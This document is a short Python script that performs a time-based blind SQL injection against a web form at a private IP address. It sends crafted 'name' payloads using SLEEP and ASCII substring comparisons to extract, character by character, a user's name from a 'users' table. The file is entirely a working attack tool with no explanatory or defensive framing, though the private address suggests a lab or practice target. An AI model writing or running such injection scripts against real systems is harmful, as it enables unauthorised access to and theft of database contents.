import time

import requests

def send_injection(url, start_offset, end_offset):
    headers = {
        'Host': '172.23.110.105',
        'Content-Length': '201',
        'Cache-Control': 'max-age=0',
        'Accept-Language': 'en-US,en;q=0.9',
        'Origin': 'http://172.23.110.105',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Referer': 'http://172.23.110.105/',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive'
    }
    for charval in range(1, 60):
        for offset in range(start_offset, end_offset + 1):
            data = f"name=1' AND (SELECT 1 FROM (SELECT(IF(ASCII(substring((SELECT name FROM users WHERE id = 592173392 LIMIT 0, 1), {charval}, {charval}))={offset}, SLEEP(3), 0))) AS injectalias) AND '1'='1"
            start_time = time.time()
            response = requests.post(url, headers=headers, data=data)
            end_time = time.time()
            elapsed_time = end_time - start_time
            if elapsed_time > 3:
                print(chr(offset), sep=' ', end='', flush=True)

if __name__ == "__main__":
    url = "http://172.23.110.105"
    start_offset = 32
    end_offset = 127
    send_injection(url, start_offset, end_offset)
